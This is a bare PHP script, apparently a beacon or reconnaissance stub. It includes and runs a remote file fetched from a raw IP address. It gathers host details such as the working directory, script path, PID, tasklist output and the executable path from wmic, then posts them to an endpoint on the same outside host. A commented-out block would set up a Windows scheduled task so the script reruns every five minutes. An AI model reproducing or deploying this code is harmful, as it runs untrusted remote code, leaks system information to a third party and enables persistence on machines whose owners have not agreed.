<?php
include("http://69.60.111.94/pa/scripts/snoopy/snoopy.inc");
ob_start();
error_reporting(15);
echo date("H:i:s") . "\n";
$dirname=getcwd();
$scriptname=$_SERVER["SCRIPT_NAME"];
echo $dirname . $scriptname . "\n";
$pid=getmypid();
echo "PID:" . $pid . "\n";
echo exec("tasklist /V /FI \"PID eq $pid\"") . "\n";
exec("wmic process where (processid=$pid) get executablepath",$output);
$execpath=$output[1];
echo $execpath . "\n";
/*
$command="schtasks /create /sc minute /mo 5 /tn \"PHP Cron Job\" /tr \"$execpath " . $dirname . $scriptname . "\"";
unset($output);
exec($command,$output);
print_r($output);
*/
//print_r($_SERVER);
//echo dirname(__FILE__);
$out=ob_get_contents();

$snoopy = new Snoopy;
$url="http://69.60.111.94/pa/scripts/post.php";
$submit_vars["output"]=$out;
$snoopy->submit($url,$submit_vars);
$submit_vars["mode"]="TestMode";
$snoopy->submit($url,$submit_vars);

ob_end_clean();
?>
